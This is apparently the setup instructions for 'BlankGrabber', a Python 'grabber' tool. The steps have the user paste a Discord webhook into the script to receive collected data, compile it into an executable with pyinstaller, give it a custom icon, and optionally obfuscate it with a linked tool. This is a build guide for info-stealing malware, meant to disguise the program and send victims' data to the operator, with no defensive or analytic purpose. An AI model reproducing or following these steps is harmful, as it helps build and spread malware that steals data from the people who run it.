Make sure you have python installed and have an active internet connection.

(1) Run the "Requirements.bat" file and let the installation complete.
(2) Place your discord webhook in the "BlankGrabber.py" file and save it

Note: If you want to add an icon, place the icon file (.ico or .exe) in the same folder and then add the line below at the end of the pyinstaller command in "Convert to exe.bat" file.

--icon <filename with extention>

(3) Run the "Convert to exe.bat" file and wait for it to complete.

Optional: You can obfuscate the code if you want using https://github.com/Blank-c/BlankOBF

(4) Check for your exe file in "dist" folder.

SPECIAL NOTE: If the exe file size is too big, you have to create a virtual environment after installing the requirements by typing "virtualenv env" in the address bar and then "env\Scripts\activate" and then copy all the 4 grabber files (you downloaded) there and create the grabber there!